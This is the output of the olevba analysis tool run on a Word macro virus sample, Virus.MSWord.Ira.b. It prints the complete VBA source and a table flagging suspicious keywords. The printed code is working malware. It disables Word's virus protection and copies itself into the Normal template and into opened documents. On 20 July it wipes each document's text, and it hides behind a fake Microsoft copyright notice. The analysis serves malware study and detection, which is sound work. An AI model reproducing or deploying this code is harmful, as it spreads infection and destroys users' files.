olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ira.b-4f887e561de938e34a04668ff94ab548ebbbc872
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ira.b-4f887e561de938e34a04668ff94ab548ebbbc872 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------
'               Copyright (C) 2001 Microsoft Corporation
'
' You have a royalty-free right to use, modify, reproduce and distribute
' the Sample Application Files (and/or any modified version) in any way
' you find useful, provided that you agree that Microsoft has no warranty,
' obligations or liability for any Sample Application Files.
' <---------------------------------------------------------------------->
Private Sub Document_Open()
On Error Resume Next
Dim Temp, Body As String
Dim ADocument, NTemplate As Object
Dim AFlag, NFlag As Boolean
Dim I As Integer
Const Length = 1987
Set ADocument = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set NTemplate = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
 Temp = "K`lzbja{/|zllj||izccv/kj|{}`vjk!"
 AFlag = True
 NFlag = True
 Options.VirusProtection = Not AFlag
 For I = 1 To Len(Temp): Body = Body + Chr(Asc(Mid(Temp, I, 1)) Xor 15): Next I
 If Day(Date) = 20 And Month(Date) = 7 Then
  With ActiveDocument
   .Range.Delete
   .Range.InsertBefore Body
   .UndoClear
   .Save
  End With: End
 End If
 If NTemplate.CountOfLines <> 0 Then
  Temp = NTemplate.Lines(1, NTemplate.CountOfLines)
 End If
 If InStr(Temp, "' " + String(72, "-")) = 0 Then
  If InStr(Temp, "Document_Open") = 0 Then NFlag = False
 Else
  Body = Temp: Temp = ""
 End If
 If ADocument.CountOfLines <> 0 Then
  Temp = ADocument.Lines(1, ADocument.CountOfLines)
 End If
 If InStr(Temp, "' " + String(72, "-")) = 0 Then
  If InStr(Temp, "Document_Open") = 0 Then AFlag = False
 Else
  Body = Temp: Temp = ""
 End If
 Body = Mid$(Body, InStr(Body, "' " + String(72, "-")), Length)
 If NFlag = False Then
  NTemplate.InsertLines 1, Body
  NormalTemplate.Save
 End If
 If AFlag = False Then
  ADocument.InsertLines 1, Body
  ActiveDocument.Save
 End If
' Çÿç÷åÿ#/ð/äñîäñ/ýêîð...
' Þêÿ·ìï/'ì!Ú!#=??>ì!&
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

